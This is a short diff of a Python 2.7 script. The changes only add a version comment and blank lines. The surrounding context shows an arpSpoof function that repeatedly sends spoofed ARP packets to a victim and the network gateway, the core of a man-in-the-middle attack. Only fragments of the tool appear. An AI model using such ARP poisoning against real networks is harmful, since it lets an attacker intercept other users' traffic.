@@ -1,3 +1,4 @@
+#python 2.7
 
 try:
     import wmi,logging,subprocess,re, threading,time
@@ -52,7 +53,9 @@ def arpSpoof(localAddresses,defaultGateway,localMAC):
                 gatewayPacket.show()
                 send(victimPacket)
                 send(gatewayPacket)
+
         time.sleep(60)
+
 
 
 def main():
